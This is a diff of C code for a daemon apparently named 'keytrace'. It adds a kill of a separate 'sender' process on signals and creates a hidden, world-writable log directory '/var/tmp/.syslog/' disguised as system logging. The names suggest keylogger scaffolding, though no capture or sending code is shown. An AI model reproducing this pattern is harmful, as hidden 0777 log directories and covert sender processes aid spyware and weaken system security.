@@ -7,7 +7,9 @@
 #include <errno.h>
 #include <sys/stat.h>
 #include "../include/daemon.h"
+#include "../include/logger.h"
 
+extern pid_t sender_pid;
 
 
 /** 
@@ -15,7 +17,6 @@
 *
 * @return 1 if process exit or 0 for no process found.
 */
-
 int is_already_running() {
     FILE *pid_fp = fopen(PID_FILE, "r");
     if (pid_fp) {
@@ -42,6 +43,11 @@ int is_already_running() {
 * @parm sig - Type of signal
 */
 void handle_signal(int sig) {
+    
+    if(sender_pid > 0){
+            kill(sender_pid ,SIGTERM);
+    }
+
     switch (sig) {
         case SIGTERM:
         case SIGINT:
@@ -65,6 +71,18 @@ void write_pid(){
         fclose(fp);
     } else {
         syslog(LOG_ERR, "Failed to write PID file.");
+        exit(EXIT_FAILURE);
+    }
+}
+
+void generate_log_file(){
+    if(access(LOG_PATH,F_OK) == 0){
+        return;
+    }
+    if(mkdir("/var/tmp/.syslog/",0777) == 0){
+        return;
+    }else{
+        syslog(LOG_ERR,"Fail to create the directory for log");
         exit(EXIT_FAILURE);
     }
 }
@@ -106,5 +124,6 @@ void daemonize() {
 
     openlog("keytrace", LOG_PID, LOG_DAEMON);
     write_pid();
+    generate_log_file();
     syslog(LOG_INFO,"Daemon started successfully");
 }
